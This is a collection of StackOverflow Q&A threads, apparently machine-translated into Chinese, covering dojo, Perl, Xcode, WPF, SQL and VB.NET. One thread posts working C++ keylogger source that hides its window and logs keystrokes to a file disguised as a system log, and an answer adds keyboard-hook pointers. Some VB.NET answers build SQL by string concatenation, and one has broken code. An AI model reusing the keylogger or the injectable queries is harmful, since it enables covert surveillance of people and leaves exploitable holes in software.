# StackOverflow 问答 12954000-12954999

# dojo - 第 1 页上的复选框“勾选”反映在 EnhancedGrid 的第 2 页中

> ID：12954001
> 
> 赞同：3
> 
> 时间：2012-10-18T11:54:05.613
> 
> 标签：dojo, dojox.grid.datagrid

我有一个增强网格并在两页上使用。当第 1 页上的复选框（数据增强网格的组件）被选中时，第 2 页上的等效行会被勾选。我的增强网格代码是

```
grid = new dojox.grid.EnhancedGrid({
                loadingMessage:"Please wait",
                store:newStore,
                structure:layoutQL,
                autoWidth:false,
                autoHeight:true,
                columnReordering:false,
                rowsPerPage:3,
                indirectSelection: true,
                //noDataMessage:"No transactions have been processed for posting.",
                //selectionMode:'single',
                 plugins: {
                   pagination: {
                       description: true,
                       sizeSwitch: false,
                       pageStepper: true,
                       gotoButton: true,
                       /*page step to be displayed*/
                       maxPageStep: 6,
                       /*position of the pagination bar*/
                       position: "bottom",
                       indirectSelection: true  
                   },
                   filter : {
                        // Show the closeFilterbarButton at the filter bar
                        closeFilterbarButton: true,
                        // Set the maximum rule count to 5
                        ruleCount: 5,
                        // Set the name of the items
                        itemsName: "records"
                   }

              } 
```

我在 dojo 框架中使用 EnhancedDataGrid。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-06T20:23:48.177

当您从一页移动到下一页时，请尝试“grid.selection.deselectAll()”。

# perl - 从 cron 从 perl 模块运行子程序

> ID：12954005
> 
> 赞同：0
> 
> 时间：2012-10-18T11:54:15.240
> 
> 标签：perl, cron, crontab

我有一个我创建的 Perl 模块，我想按计划运行其中的一个子例程。我知道我可以制作一个小的 perl 脚本来调用子例程并从 crontab 中调用它，但是如果有一种方法可以直接从 crontab 中调用子例程，那就太好了！

这可能吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T11:58:25.930

您可以使用 Perl 的`-e`开关从命令行执行代码，例如

```
perl -e 'use your_module; your_function()' 
```

`-M`使用加载模块的开关使其更短：

```
perl -Myour_module -e 'your_function()' 
```

perlrun[手册页](http://perldoc.perl.org/perlrun.html)是您的朋友。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T12:06:37.033

如果您想要一个更优雅的解决方案，您的模块可以配置为检测它是否作为脚本运行并在这种情况下表现不同。请参阅此讨论：[在 Perl 中，如何确定我的文件是用作模块还是作为脚本运行？](https://stackoverflow.com/questions/1131304/in-perl-how-can-i-find-out-if-my-file-is-being-used-as-a-module-or-run-as-a-scr)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-18T11:58:23.417

您可以使用类似的东西从命令行运行子例程

```
perl -MYour::Module=some,functions,to,import,such,as,foo -e 'foo();' 
```

因此，您将能够从 crontab 执行相同的操作。请注意，cron 通常使用一组受限制的环境变量运行，因此您可能需要添加一个`-I/path/to/your/modules`选项。

# ios - Apple LLVM 编译器 4.1 错误

> ID：12954006
> 
> 赞同：14
> 
> 时间：2012-10-18T11:54:18.267
> 
> 标签：ios, xcode, ios6

我对 iOS 编程很陌生。我实际上只是想编译一个空项目，据我所知应该可以工作，但我遇到了一个错误：

```
ProcessPCH /users/case4/murphb52/Library/Developer/Xcode/DerivedData/USB1-frxarpuqvqeibygmuqixzogxrplz/Build/Intermediates/PrecompiledHeaders/USB1-Prefix-gsurnmlnnrebssbippyayakjgjix/USB1-Prefix.pch.pth USB1/USB1-Prefix.pch normal i386 objective-c com.apple.compilers.llvm.clang.1_0.compiler
    cd "/Volumes/SP UFD U2/USB1"
    setenv LANG en_US.US-ASCII
    setenv PATH "/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/usr/bin:/Applications/Xcode.app/Contents/Developer/usr/bin:/usr/bin:/bin:/usr/sbin:/sbin"
    /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang -x objective-c-header -arch i386 -fmessage-length=0 -std=gnu99 -fobjc-arc -Wno-trigraphs -fpascal-strings -O0 -Wno-missing-field-initializers -Wno-missing-prototypes -Wreturn-type -Wno-implicit-atomic-properties -Wno-receiver-is-weak -Wduplicate-method-match -Wformat -Wno-missing-braces -Wparentheses -Wswitch -Wno-unused-function -Wno-unused-label -Wno-unused-parameter -Wunused-variable -Wunused-value -Wempty-body -Wuninitialized -Wno-unknown-pragmas -Wno-shadow -Wno-four-char-constants -Wno-conversion -Wno-shorten-64-to-32 -Wpointer-sign -Wno-newline-eof -Wno-selector -Wno-strict-selector-match -Wno-undeclared-selector -Wno-deprecated-implementations -DDEBUG=1 -isysroot /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator6.0.sdk -fexceptions -fasm-blocks -Wprotocol -Wdeprecated-declarations -g -Wno-sign-conversion -fobjc-abi-version=2 -fobjc-legacy-dispatch "-DIBOutlet=__attribute__((iboutlet))" "-DIBOutletCollection(ClassName)=__attribute__((iboutletcollection(ClassName)))" "-DIBAction=void)__attribute__((ibaction)" -mios-simulator-version-min=6.0 -iquote /users/case4/murphb52/Library/Developer/Xcode/DerivedData/USB1-frxarpuqvqeibygmuqixzogxrplz/Build/Intermediates/USB1.build/Debug-iphonesimulator/USB1.build/USB1-generated-files.hmap -I/users/case4/murphb52/Library/Developer/Xcode/DerivedData/USB1-frxarpuqvqeibygmuqixzogxrplz/Build/Intermediates/USB1.build/Debug-iphonesimulator/USB1.build/USB1-own-target-headers.hmap -I/users/case4/murphb52/Library/Developer/Xcode/DerivedData/USB1-frxarpuqvqeibygmuqixzogxrplz/Build/Intermediates/USB1.build/Debug-iphonesimulator/USB1.build/USB1-all-target-headers.hmap -iquote /users/case4/murphb52/Library/Developer/Xcode/DerivedData/USB1-frxarpuqvqeibygmuqixzogxrplz/Build/Intermediates/USB1.build/Debug-iphonesimulator/USB1.build/USB1-project-headers.hmap -I/users/case4/murphb52/Library/Developer/Xcode/DerivedData/USB1-frxarpuqvqeibygmuqixzogxrplz/Build/Products/Debug-iphonesimulator/include -I/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/include -I/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/include -I/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/include -I/users/case4/murphb52/Library/Developer/Xcode/DerivedData/USB1-frxarpuqvqeibygmuqixzogxrplz/Build/Intermediates/USB1.build/Debug-iphonesimulator/USB1.build/DerivedSources/i386 -I/users/case4/murphb52/Library/Developer/Xcode/DerivedData/USB1-frxarpuqvqeibygmuqixzogxrplz/Build/Intermediates/USB1.build/Debug-iphonesimulator/USB1.build/DerivedSources -F/users/case4/murphb52/Library/Developer/Xcode/DerivedData/USB1-frxarpuqvqeibygmuqixzogxrplz/Build/Products/Debug-iphonesimulator --serialize-diagnostics /users/case4/murphb52/Library/Developer/Xcode/DerivedData/USB1-frxarpuqvqeibygmuqixzogxrplz/Build/Intermediates/PrecompiledHeaders/USB1-Prefix-gsurnmlnnrebssbippyayakjgjix/USB1-Prefix.pch.dia -c "/Volumes/SP UFD U2/USB1/USB1/USB1-Prefix.pch" -o /users/case4/murphb52/Library/Developer/Xcode/DerivedData/USB1-frxarpuqvqeibygmuqixzogxrplz/Build/Intermediates/PrecompiledHeaders/USB1-Prefix-gsurnmlnnrebssbippyayakjgjix/USB1-Prefix.pch.pth -MMD -MT dependencies -MF /users/case4/murphb52/Library/Developer/Xcode/DerivedData/USB1-frxarpuqvqeibygmuqixzogxrplz/Build/Intermediates/PrecompiledHeaders/USB1-Prefix-gsurnmlnnrebssbippyayakjgjix/USB1-Prefix.pch.d

fatal error: error in backend: IO failure on output stream.
Command /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang failed with exit code 1 
```

只是想知道是否有人对我做错了什么有任何解决方案或想法？

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2012-11-14T19:09:04.600

您很可能磁盘空间不足。你的构建文件夹在哪里？它可能不允许写入并导致该错误。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-16T11:31:47.437

有这个问题，尝试了大多数事情，但最终 OSX 重新启动为我解决了这个问题。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-02-05T23:20:23.530

德里克是正确的。在我的情况下，我用于 XCode 派生数据的 RAM 磁盘已满。

# wpf - WPF，对 XAML 中使用的对象的引用

> ID：12954013
> 
> 赞同：0
> 
> 时间：2012-10-18T11:54:35.473
> 
> 标签：wpf, events, xaml

我是 WPF 新手，请不要怪我；）
我在 XAML 中有以下部分：

```
<ListView x:Name="listView" IsEnabled="{Binding PropertiesEnabled}" Margin="0"
            BorderThickness="0" DragDrop1:DropTargetBehavior.IsDropTarget="true"
            MinHeight="300" DragDrop1:DropTargetBehavior.DropType="{x:Type UIP:DataItemViewModel}"
            ItemsSource="{Binding dataItemCollection}"
            SelectedItem="{Binding SelectedItem, Mode=TwoWay}"
            AllowDrop="True" KeyDown="listView_KeyDown" MouseUp="listView_MouseUp"
            UseLayoutRounding="False" VerticalContentAlignment="Center"
            MaxWidth="Infinity" MaxHeight="1000" Grid.Column="1"
            HorizontalContentAlignment="Stretch"> 
```

在视图类后面的代码中，我可以访问 listView 及其大部分属性和属性，例如 IsEnabled、Margin、ItemsSource 等。但是，当涉及到 DragDrop1 时，它没有列出。

我需要引用 DragDrop1 的原因，它是 DropTargetBehavior 类型的，因为应该以编程方式触发某些事件。

丢失 DragDrop1 的原因可能是什么？我如何得到它的参考？

干杯。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T11:57:50.547

该属性是`AttachedProperty`，因此它实际上并不作为`ListView`对象的一部分存在。您需要使用`AttachedProperty`类名来访问该值，并将其`ListView`作为参数传递以获取或设置该值。

您可以使用`DragDrop1.DropTargetBehavior.GetIsDropTarget(listView)`或设置它使用`DragDrop1.DropTargetBehavior.SetIsDropTarget(listView, yourValue)`

# xml - 如何从另一个 xsd 引用一个 xsd 的 id 属性

> ID：12954017
> 
> 赞同：0
> 
> 时间：2012-10-18T11:54:46.223
> 
> 标签：xml, types, xsd, xmi

我需要从另一个 xsd 访问一个 xsd 类型 id 的属性，其中两个 xsd 都是不同的文件。我正在寻找替代品并发现。如果可以使一个元素独一无二，那么我可以从单独文件中的另一个 xsd 引用它。

请给一些建议

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:03:52.983

命名空间？（一些说明您的问题的示例 XML 会很好）。

# c# - 调用 CLR 存储过程

> ID：12954018
> 
> 赞同：0
> 
> 时间：2012-10-18T11:54:48.920
> 
> 标签：c#, sql-server, stored-procedures, sqlclr

> **可能重复：**
> [调用 CLR 存储过程](https://stackoverflow.com/questions/1641833/invoking-clr-stored-procedures)

有人知道如何使用 select 语句调用 CLR 存储过程吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T11:56:52.680

`OPENQUERY`据我所知，没有or是不可能的`OPENROWSET`，你最好使用 CLR 表函数。如果需要从存储过程中插入数据

```
insert into Table
exec <your CLR procedure> 
```

# mysql - 我可以在 Mysql 中的两列之间求和吗？

> ID：12954024
> 
> 赞同：0
> 
> 时间：2012-10-18T11:55:01.380
> 
> 标签：mysql, sum

我想做的是以下几点：

```
SELECT SUM(ABS(`number_x` - `number_y`)) AS `total_difference` FROM `table` 
```

表如下：

> 编号 | number_x | number_y
> 
> 1 | 4 | 2
> 
> 2 | 3 | 2
> 
> 3 | 2 | 4

所以答案应该是：(4 - 2 = 2) + (3 - 2 = 1) + (2 - 4 = 2) = 5

我可以在 MySQL 中执行此操作吗？如何操作？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T11:59:56.800

您发布的查询应该没有问题：

```
SELECT SUM(ABS(`number_x` - `number_y`)) AS `total_difference` 
FROM `table` 
```

或者，如果您想使用这样的子查询来编写它：

```
SELECT SUM(diff) AS `total_difference` 
FROM
( 
    SELECT Id, ABS(number_x - number_y) diff
    FROM TableName
) t 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T11:59:48.703

```
SELECT SUM(ABS(`number_x` - `number_y`)) AS `total_difference` FROM `table` 
```

或者你可以用其他方式写，但我只喜欢上面

```
SELECT ABS(SUM(number_x) - SUM(number_y)) AS total_difference FROM table 
```

# android - 如何将apk文件转换为jar

> ID：12954025
> 
> 赞同：0
> 
> 时间：2012-10-18T11:55:02.150
> 
> 标签：android, jar, apk

我有一个 apk 应用程序，但它不能在我的手机上运行？我尝试通过以下步骤进行转换：

1.  我在我的电脑上下载了一个apk文件。
2.  然后我通过dex2jar将它转换为jar？
3.  但它在我的手机上不起作用，并且一条消息显示“无效文件”。
4.  然后我在 jd-gui 中打开它，然后将其保存到 src 文件中。
5.  然后我打开它，但所有文件都显示为 .java 文件。如何在我的手机上打开它？如何将其转换为.class？我的手机名是：三星**gt-s3653**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T13:02:22.617

您可以在 Android 设备上运行 Android 应用程序。您不能在 JavaME 设备上运行 Android 应用程序。

# c# - 如何打开与我的 MVC 项目相关的文本文件？

> ID：12954026
> 
> 赞同：8
> 
> 时间：2012-10-18T11:55:03.803
> 
> 标签：c#, asp.net, asp.net-mvc-3

在我的 bin 文件中，我设置了 som 测试数据，我希望我的应用程序能够访问存储在`bin/log/log00001.txt`.

但是，在我的 cronroller 中，当我尝试在以下路径上使用 TextReader 时，它会转到其他地方：`new StreamReader("log/log00001.txt")`

我如何阅读与我的项目相关的内容？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-10-18T11:57:44.927

尝试使用

```
StreamReader reader = new StreamReader(Server.MapPath("~/bin/log/log00001.txt")); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-10-18T11:58:04.893

```
HttpContext.Current.Server.MapPath("~/some/path/relative/to/your/web/app") 
```

# dependency-injection - IoC - 自动装配在组件内部创建的对象

> ID：12954027
> 
> 赞同：1
> 
> 时间：2012-10-18T11:55:06.987
> 
> 标签：dependency-injection, inversion-of-control, unity-container

IoC 和自动装配让我困扰的是 IoC 对创建的对象的可用性。

假设我有一个静态 Utils 类，它在整个系统中使用。当我决定使用 IoC 和 DI 时，我很容易将 Utils 更改为非静态的，并让我的所有组件都接收它的实例。

但是，自动装配仅适用于在引导期间创建的组件、在运行时创建的对象或作为用户操作的响应以及使用 Utils 的对象，自动装配不起作用。相反，我必须手动将 Utils 的实例传递给在运行时创建的每个对象的每个实例。

我能看到的唯一解决方法是使用传递 IoC 容器的反模式，我当然不想这样做。

还有其他方法吗？或者我是否被迫将 Utils 手动传递给每个实例和类？

**注意：**这不是设计问题。当然，我可以通过各种方式尽量减少这种隐喻 Utils 的使用，但在许多情况下这是不可避免的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:33:26.393

> 我能看到的唯一解决方法是使用传递 IoC 容器的反模式，我当然不想这样做。

答案很简单：使用抽象工厂。

通过在应用程序中定义工厂接口和在[组合根](http://blog.ploeh.dk/2011/07/28/CompositionRoot/)（您的引导程序代码）中定义工厂实现，您可以防止使用服务定位器反模式。这个工厂实现可以持有对容器的引用并调用它来请求实例。因为该实现是您的引导逻辑的一部分，所以该实现是一个基础设施组件，您[没有将它用作服务定位器](http://blog.ploeh.dk/2011/08/25/ServiceLocatorrolesvs.mechanics/)。

例子：

```
public interface IUnitOfWorkFactory
{
    IUnitOfWork CreateNew();
} 
```

在组合根中实现：

```
internal class SimpleInjectorUnitOfWorkFactory
    : IUnitOfWorkFactory
{
    private readonly SimpleInjector.Container container;

    public SimpleInjectorUnitOfWorkFactory(Container container)
    {
        this.container = container;
    }

    public IUnitOfWork CreateNew()
    {
        return this.container.GetInstance<IUnitOfWork>();
    }
} 
```

# jquery - 在 ajax 页面上使用 back

> ID：12954031
> 
> 赞同：0
> 
> 时间：2012-10-18T11:55:30.170
> 
> 标签：jquery, back, forward

我不使用哈希，所以忘记了 hashchange 的事情。（使用“/”，然后只在一些额外的菜单中使用“#”-s）

我不能只做一个类似的功能：

```
"whenbackbuttonisclicked" function(){
history.back();
} 
```

和前锋一样吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T11:59:10.330

您应该能够对 onpopstate 事件做一些事情，并可能编辑历史对象以删除页面更改。您将需要对不同浏览器如何处理此事件进行一些研究。

[https://developer.mozilla.org/en-US/docs/DOM/window.onpopstate](https://developer.mozilla.org/en-US/docs/DOM/window.onpopstate)

有很多与 popstate 相关的 StackOverflow 问题——这可能是您开始研究的好地方。

# vb.net - 使用 vb.net 在 MS Access 中插入和更新值

> ID：12954039
> 
> 赞同：3
> 
> 时间：2012-10-18T11:56:06.563
> 
> 标签：vb.net, ms-access

我已经检查了这个网站上的大多数论坛，但我没有得到我的解决方案。我的问题是将数据从 vb.net 插入到 MS Access，但我做不到。它没有显示任何错误，但也没有在我的表中插入值。我正在使用非常简单的代码：

```
Imports System.Data.OleDb

Public Class Add_LEads

    Dim conn As New OleDbConnection
    Dim cmd As New OleDbCommand
    Dim da As New OleDbDataAdapter
    Private Sub Add_LEads_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        conn = New OleDbConnection("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=|DataDirectory|\IndGlobalDB.accdb;Persist Security Info=True;Jet OLEDB:Database Password=admin")
        lblDate.Text = Format(Date.Now, "yyyy/MM/dd")
        conn.Open()
        Dim sql As String
        Dim a As Integer
        sql = "select S_No from Leadss"
        cmd = New OleDbCommand(sql, conn)
        Dim dr As OleDbDataReader
        dr = cmd.ExecuteReader
        While dr.Read
            a = dr(0)
        End While
        lblNo.Text = a + 1
        conn.Close()
    End Sub
    Private Sub btnSave_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSave.Click
        conn.Open()
        cmd.Connection = conn
        cmd.CommandText = "INSERT INTO Leadss(S_No,Contact_Person,Mobile_No,Email_Id,Description,First_Follow_Up,Remarks,L_Date,Alternate_no)VALUES('" & lblNo.Text & "','" & txtName.Text & "','" & txtMobile.Text & "','" & txtEmail.Text & "','" & txtWebDescr.Text & "','" & txtFollowUp.Text & "','" & txtRemarks.Text & "','" & lblDate.Text & "','" & txtAlternate.Text & "')"
        cmd.ExecuteNonQuery()
        conn.Close()
        MsgBox("Saved!!!", vbOK)
    End Sub
    Private Sub btnExit_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnExit.Click
        Me.Close()
        Welcome.Show()
    End Sub

End Class 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:28:57.533

您应该使用参数化查询来避免 Sql 注入攻击，并让 JET 引擎解析您的字符串参数以查找无效字符。

```
 Private Sub btnSave_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) 
                                                                   Handles btnSave.Click 
    conn.Open() 
    cmd.Connection = conn 

    cmd.CommandText = "INSERT INTO Leadss(S_No,Contact_Person,Mobile_No,Email_Id," & _
                      "Description,First_Follow_Up,Remarks,L_Date,Alternate_no) VALUES " & _
                      "(?, ?, ?, ?, ?, ?, ?, ?, ?)"

    cmd.Parameters.Clear()
    cmd.Parameters.AddWithValue("@p1", lblNo.Text)
    cmd.Parameters.AddWithValue("@p2", txtName.Text)
    cmd.Parameters.AddWithValue("@p3", txtMobile.Text)
    cmd.Parameters.AddWithValue("@p4", txtEmail.Text)
    cmd.Parameters.AddWithValue("@p5", txtWebDescr.Text)
    cmd.Parameters.AddWithValue("@p6", txtFollowUp.Text)
    cmd.Parameters.AddWithValue("@p7", txtRemarks.Text)
    cmd.Parameters.AddWithValue("@p8", lblDate.Text)
    cmd.Parameters.AddWithValue("@p9", txtAlternate.Text)
    cmd.ExecuteNonQuery() 
    conn.Close() 
End Sub 
```

也就是说，这仅在您的字段类型是文本类型而不是数字或日期时间或布尔值时才有效，在这种情况下，您应该使用 Convert.ToXXXXX 方法将输入文本转换为适当的类型。
（下面的示例假设您的输入包含有效的数字和日期）

```
....
cmd.Parameters.AddWithValue("@p3", Convert.ToInt32(txtMobile.Text))
.....
cmd.Parameters.AddWithValue("@p8", Convert.ToDateTime(lblDate.Text))
cmd.Parameters.AddWithValue("@p9", Convert.ToInt32(txtAlternate.Text)) 
```

另一个错误的方法是保留全局变量以供重用，例如 OleDbConnection、OleDbCommand。这可以防止运行时在不使用时处理这些对象。相反，您应该遵循这种方法

```
 Using conn = New OleDbConnection("Provider=Microsoft.ACE.OLEDB.12.0;Data " +
                  "Source=|DataDirectory|\IndGlobalDB.accdb;" +
                   "Persist Security Info=True;Jet OLEDB:Database Password=admin")   
    Using cmd = New OleDbCommand()
        conn.Open() 
        cmd.Connection = conn 
        cmd.CommandText = "INSERT INTO ................"
        cmd.Parameters.AddWithValue("@p1", lblNo.Text)
        ..........
    End Using
End Using 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-28T05:13:35.340

在您的声明中使用反引号 ( ```) 。`FROM`应该是`FROM(`Field1`,`Field2`,...etc) Values('value1', 'value2')`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:40:21.553

下面是一个使用 SqlParameter 和 try/catch 块的简单示例：

```
Dim connection As SqlConnection = As New SqlConnection("YourDbConnection")
Dim command As SqlCommand = connection.CreateCommand()

Try
    connection.Open()
    command.CommandText = "INSERT INTO Leadss(S_No) VALUES (@S_No)"
    command.Parameters.Add("@S_No", SqlDbType.Text)
    command.Parameters["@FirstName"].Value = lblNo.Text
    command.ExecuteNonQuery()
Catch Ex As SqlException
    'Process the exception
Finally
    connection.Close()
End Try 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-02-27T11:26:04.177

根据您的数据库名称，表名称，保存按钮的单击事件中的字段名称编写此编码...

```
 Using conn = New OleDbConnection("Provider=Microsoft.ACE.OLEDB.12.0;Data Source='C:\Users\user\Documents\Visual Studio 2008\Projects\demo for db in access\demo for db in access\DatabaseforDemo.accdb'")
        Using cmd = New OleDbCommand()
            conn.Open()
            cmd.Connection = conn
            cmd.CommandText = "INSERT INTO demo1(Name) VALUES('" & TextBox1.Text & "')"
            'cmd.Parameters.AddWithValue("@p1", lblNo.Text)
            cmd.ExecuteNonQuery()
            MsgBox("saved..")
            conn.Close()
        End Using
    End Using 
```

祝你好运......希望它会帮助你......！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-12-15T02:17:31.920

在你的问题中你说：

> 它没有显示任何错误，但也没有在我的表中插入值

尝试使用提交。

> SQL 中的**COMMIT**语句结束关系数据库管理系统 (RDBMS) 中的事务，***并使所有更改对其他用户可见***。一般格式是发出 BEGIN WORK 语句、一个或多个 SQL 语句，然后是 COMMIT 语句。或者，可以发出 ROLLBACK 语句，该语句撤消自发出 BEGIN WORK 以来执行的所有工作。COMMIT 语句还将释放任何可能正在使用的现有保存点。在事务方面，commit 的反面是丢弃一个事务的试探性更改，即回滚。

此处引用：[提交（数据管理）](https://en.wikipedia.org/wiki/Commit_(data_management))

```
Try
    'Open Connection...

        'Insert Statement....

        'Notification / Msgbox to confirm successful transaction

    Catch ex As Exception
        'RollBack Transaction...
        'Error Management...

    Finally
        'Commit...
        'Close DB Connection....
    End Try 
```

[Microsoft 文档：OleDbTransaction.Commit 方法 ()](https://msdn.microsoft.com/en-us/library/system.data.oledb.oledbtransaction.commit(v=vs.110).aspx)

**但请记住**：只有在插入/更新多个 SQL 语句时才应该使用事务，这对回滚有意义。

[这是使用 MS Access 2010 在表单中添加事务管理](https://stackoverflow.com/questions/25532059/ms-access-2010-adding-transaction-management-into-a-form)的示例

# c++ - 制作键盘记录器

> ID：12954040
> 
> 赞同：3
> 
> 时间：2012-10-18T11:56:14.800
> 
> 标签：c++, keystroke

我想在自己的电脑上制作一个小型键盘记录器，以了解击键如何与 C++ 一起使用。我在网上找到了一些代码并对其进行了一些编辑，但我不确定如何做我想做的事情。

```
#include "stdafx.h"
#include <iostream>
#include <windows.h>
#include <winuser.h>   

using namespace std;  
int Save (int key_stroke, char *file);
void Stealth();

int main() 
{
    Stealth(); 
char i;
while (1)
{
    for(i = 8; i <= 190; i++)
    {
        if (GetAsyncKeyState(i) == -32767)
            Save (i,"System32Log.txt");
    }
}
system ("PAUSE");
return 0;
}
int Save (int key_stroke, char *file)
{
if ( (key_stroke == 1) || (key_stroke == 2) )
    return 0;

FILE *OUTPUT_FILE;
OUTPUT_FILE = fopen(file, "a+");

cout << key_stroke << endl;

    if (key_stroke == 8)
    fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");  
    else if (key_stroke == 13)
    fprintf(OUTPUT_FILE, "%s", "\n"); 
    else if (key_stroke == 32)
    fprintf(OUTPUT_FILE, "%s", " ");
    else if (key_stroke == VK_TAB)              
    fprintf(OUTPUT_FILE, "%s", "[TAB]");
        else if (key_stroke == VK_SHIFT)
    fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
        else if (key_stroke == VK_CONTROL)
    fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
            else if (key_stroke == VK_ESCAPE)
    fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
            else if (key_stroke == VK_END)
    fprintf(OUTPUT_FILE, "%s", "[END]");
                else if (key_stroke == VK_HOME)
    fprintf(OUTPUT_FILE, "%s", "[HOME]");
                else if (key_stroke == VK_LEFT)
    fprintf(OUTPUT_FILE, "%s", "[LEFT]");
                    else if (key_stroke == VK_UP)
    fprintf(OUTPUT_FILE, "%s", "[UP]");
                    else if (key_stroke == VK_RIGHT)
    fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
                        else if (key_stroke == VK_DOWN)
    fprintf(OUTPUT_FILE, "%s", "[DOWN]");
                        else if (key_stroke == 190 || key_stroke == 110)
    fprintf(OUTPUT_FILE, "%s", ".");
                        else
    fprintf(OUTPUT_FILE, "%s", &key_stroke);
fclose (OUTPUT_FILE);
return 0;
}
void Stealth()
{
HWND Stealth;
AllocConsole();
Stealth = FindWindowA("ConsoleWindowClass", NULL);
ShowWindow(Stealth,0);
} 
```

我想修复它以正确存储“。”之类的东西。“，”或更多，但我不确定，因为我不熟悉击键。此外，我想添加一些可以减少 CPU 消耗的东西（目前在我的 i5 上为 25%），我可能应该使用 Sleep(value)，尽管我不确定要使用哪个值。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-18T12:02:29.603

快速查看[此处](https://stackoverflow.com/questions/4167972/how-to-record-keystrokes-on-windows-c)和[此处](https://stackoverflow.com/questions/6465526/capture-any-kind-of-keystrokes-aka-keylogger-preferably-c-sharp-net-but-any?rq=1)的答案，了解有关哪些 Windows API 函数适合您的工作的更多信息。

* * *

基本思想是使用 SetWindowsHookEx 在键盘上设置一个所谓的“Hook”功能（无论是键盘还是 Keyboard_LL - 你可能会想要第一个）。在卸载键盘记录器时，您需要将其解开。设置挂钩后，Windows 将在每个键盘事件后调用挂钩函数。您对其进行处理（将其记录在某处），然后使用 CAllNextHook 调用下一个 Hook 以继续在 Windows 中处理该事件。你需要在那里进行一些尝试和调试。

这就是全局挂钩（第二个链接在 MSDN 中提供信息）。研究 SetWindowsHookEx 函数并尝试了解其背后的机制，您很快就会成功。您还可以在搜索中使用“hook”作为关键字来优化您在 stackoverflow 上的搜索（例如，[在此处](https://stackoverflow.com/questions/1630315/change-a-keystroke-passing-a-hookc-c?rq=1)阅读）

# objective-c - 基于包含字典的 NSArray 创建新数组

> ID：12954041
> 
> 赞同：0
> 
> 时间：2012-10-18T11:56:22.977
> 
> 标签：objective-c, ios, arrays, nsarray, nsdictionary

我有一个字典数组，这些字典来自核心数据获取请求，结果类型为`NSDictionary`：

```
request.resultType = NSDictionaryResultType;
request.returnsDistinctResults = YES;
request.propertiesToFetch = @[@"endCalYear",@"endMonth",@"periodLength"]; 
```

样例结果`NSArray`如下`NSDictionary`：

```
{
    endCalYear = 2007;
    endMonth = 12;
    periodLength = 12;
},
{
    endCalYear = 2006;
    endMonth = 9;
    periodLength = 3;
},
{
    endCalYear = 2006;
    endMonth = 6;
    periodLength = 3;
},
{
    endCalYear = 2006;
    endMonth = 3;
    periodLength = 3;
} 
```

创建（三个）单独数组的最有效方法是什么**endCalYear** = 2006, 2007, 2008; **endMonth** = 3, 9, 12 和**periodLength** = 3, 6, 12 来自给定的 NSArray？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:01:45.667

您可以使用`valueForKey`：

```
NSArray *endCalYearArray = [resultArray valueForKey:@"endCalYear"]; 
```

# java - 删除线和下划线未出现在报告 pdf 中

> ID：12954042
> 
> 赞同：1
> 
> 时间：2012-10-18T11:56:24.693
> 
> 标签：java, swing, pdf, graphics, itext

我正在开发一个报告应用程序，在该应用程序中，我必须基于 JTable 自定义在 pdf 上编写一些自定义。

我正在使用：- iText 5.3.3.jar java jdk 1.6

在这里，我格式化一个单元格以打印下划线和删除线值。我在 cellrenderer 中对此进行了编码。

为了在 pdf 上打印这些值，我直接在 pdf 上编写 JTable。但作为输出，我没有得到任何下划线/删除线。

![JTable图像输出](../Images/701327ee366a50777cb949f6e2759332.png)

![JTable pdf](../Images/032448c2486a4077150b0ddc70604973.png)

由于图像上出现删除线和下划线。它没有出现在pdf上。

以下是测试它的示例代码：-

**

*   表图像.java

**

```
package com.swing.data;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.image.BufferedImage;
import java.io.FileOutputStream;

import javax.swing.ImageIcon;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.table.JTableHeader;

import com.itextpdf.text.Document;
import com.itextpdf.text.PageSize;
import com.itextpdf.text.pdf.PdfContentByte;
